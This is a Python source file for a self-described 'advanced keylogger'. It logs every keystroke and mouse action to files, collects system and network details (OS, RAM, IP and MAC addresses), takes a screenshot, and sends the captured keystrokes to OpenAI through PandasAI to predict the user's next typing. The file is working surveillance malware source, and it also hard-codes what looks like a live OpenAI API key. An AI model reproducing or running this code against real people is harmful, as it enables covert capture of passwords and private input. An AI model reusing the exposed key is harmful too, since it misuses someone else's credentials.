# Advannce Keylogger
# --------------------------------------------
# Features will include:
# --------------------------------------------
"""
- Save mouse activity
- Save every single key and special character
- Gets computer info (RAM,OS) 
- Network Info (Ip address, MAC address)
- Screenshot
- Make prediction using ML
"""
# ---------------------------------------------
# The Libraries will include:
# ---------------------------------------------
"""
-Logging Keys: Pynput.keyboard
-Log File: logging
-Computer Information: platform, psutil
-Network Information: ifaddr, uuid
-Screenshots: pyautogui
-Prediction - pandas, pandasai, csv
"""
# ---------------------------------------------
# Importing libraries
from pynput import mouse, keyboard
from pandasai import PandasAI
from pandasai.llm import OpenAI
import pandas as pd 
import logging
import platform
import psutil
import uuid
import ifaddr
import pyautogui
import csv


# Set up logging for mouse activity
mouse_logging = logging.getLogger("MouseActivity")
mouse_logging.setLevel(logging.INFO)
mouse_formatter = logging.Formatter('%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
mouse_handler = logging.FileHandler("mouse_activity.log")
mouse_handler.setFormatter(mouse_formatter)
mouse_logging.addHandler(mouse_handler)

# Set up logging for keyboard activity
keyboard_logging = logging.getLogger("KeyboardActivity")
keyboard_logging.setLevel(logging.INFO)
keyboard_formatter = logging.Formatter('%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
keyboard_handler = logging.FileHandler("keyboard_activity.log")
keyboard_handler.setFormatter(keyboard_formatter)
keyboard_logging.addHandler(keyboard_handler)

keywords = []

# Decorator 
def print_message(cls):
    def wrapper(*args, **kwargs):
        print(f"Calling {cls.__name__}...")
        result = cls(*args, **kwargs)
        print(f"{cls.__name__} completed.")
        return result
    return wrapper

# Class for controlling all mouse activity/Positions
@print_message
class MouseActivity:

    # Callback function for mouse movement
    def on_move(self, x, y):
        activity = f'Mouse moved to {x}, {y}'
        mouse_logging.info(activity)

     # Callback function for mouse button press or release
    def on_click(self, x, y, button, pressed):
        activity = f'Mouse {"Pressed" if pressed else "Released"} at {x}, {y}'
        mouse_logging.info(activity)

        if not pressed and button == mouse.Button.right:
            # Stop listener
            return False

    # Callback function for mouse scrolling
    def on_scroll(self, x, y, dx, dy):
        scroll_direction = "down" if dy < 0 else "up"
        activity = f'Scrolled {scroll_direction} at {x}, {y}'
        mouse_logging.info(activity)

# Class for controlling keyboard activity
@print_message
class KeyboardActivity:

    # Callback function for key press
    def on_press(self, key):
        try:
            if hasattr(key, 'char'):
                activity = f'alphanumeric key {key.char} pressed'
                keyboard_logging.info(activity)
                keywords.append(key.char)
            else:
                activity = f'special key {key} pressed'
                keyboard_logging.info(activity)
        except Exception as e:
            print(f"An error occurred in on_press: {e}")

    # Callback function for key release
    def on_release(self, key):
        activity = f'{key} released'
        keyboard_logging.info(activity)

        if key == keyboard.Key.esc:
            # Stop listener
            return False

    # Start the keyboard listener
    def start_listener(self):
        with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release) as listener:
            listener.join()

# Class to gather computer information
class ComputerInfo:
    @staticmethod
    def get_info():
        os_info = platform.uname()  # Get OS information
        cpu_info = platform.processor()  # Get CPU information
        ram_info = round(psutil.virtual_memory().total / (1024.0 ** 3), 2)  # Get RAM information in GB
        return f"OS: {os_info.system} {os_info.release}\nCPU: {cpu_info}\nRAM: {ram_info} GB"

# Class to gather network information
class NetworkInfo:
    @staticmethod
    def get_info():
        adapters = ifaddr.get_adapters()  # Get network adapters
        network_info = ""
        for adapter in adapters:
            for ip in adapter.ips:
                if ip.is_IPv4:
                    mac_address = ':'.join(f"{b:02x}" for b in uuid.getnode().to_bytes(6, byteorder='big'))
                    network_info += f"Interface: {adapter.nice_name}\nIP Address: {ip.ip}\nMAC Address: {mac_address}\n"
        return network_info


# Class to capture screenshots
class ScreenshotCapture:
    @staticmethod
    def capture():
        screenshot = pyautogui.screenshot()  # Capture screenshot
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)  # Save screenshot
        return f"Screenshot captured and saved as '{screenshot_path}'"

# class to make prediction    
class MachineLearning:
    @staticmethod
    def get_prediction():

        csv_filename = 'keywords.csv'
        with open(csv_filename, mode='w', newline='') as csv_file:
            csv_writer = csv.writer(csv_file)
            csv_writer.writerow(['Keywords'])

            for keyword in keywords:
                csv_writer.writerow([keyword])
        
        df = pd.read_csv("keywords.csv")
        llm = OpenAI(api_token="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")
        pandas_ai = PandasAI(llm, verbose=True, conversational=True)
        response = pandas_ai(df, "What is the next 5 to 10 letters user will type next?")
        return response

# Main
if __name__ == "__main__":

    mouse_activity = MouseActivity()
    keyboard_activity = KeyboardActivity()

    try:
        # Start mouse listener
        mouse_listener = mouse.Listener(
            on_move=mouse_activity.on_move,
            on_click=mouse_activity.on_click,
            on_scroll=mouse_activity.on_scroll)
        mouse_listener.start()

        # Start keyboard listener
        keyboard_listener = keyboard.Listener(
            on_press=keyboard_activity.on_press,
            on_release=keyboard_activity.on_release)
        keyboard_listener.start()

        # Keep the listeners running
        mouse_listener.join()
        keyboard_listener.join()
    except KeyboardInterrupt:
        # Handle KeyboardInterrupt (Ctrl+C) gracefully
        print("KeyboardInterrupt detected. Exiting...")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Stop the listeners on program exit
        if mouse_listener:
            mouse_listener.stop()
            mouse_listener.join()

        if keyboard_listener:
            keyboard_listener.stop()
            keyboard_listener.join()

     # Save computer info to a file
    computer_info = ComputerInfo.get_info()
    with open("computer_info.txt", "w") as comp_info_file:
        comp_info_file.write(computer_info)
    
    # Save network info to a file
    network_info = NetworkInfo.get_info()
    with open("network_info.txt", "w") as net_info_file:
        net_info_file.write(network_info)
    
    # Capture screenshot
    screenshot_msg = ScreenshotCapture.capture()
    print(screenshot_msg)

    # Make Perdiction using PandasAI
    next_letter = MachineLearning.get_prediction()
    print(next_letter)
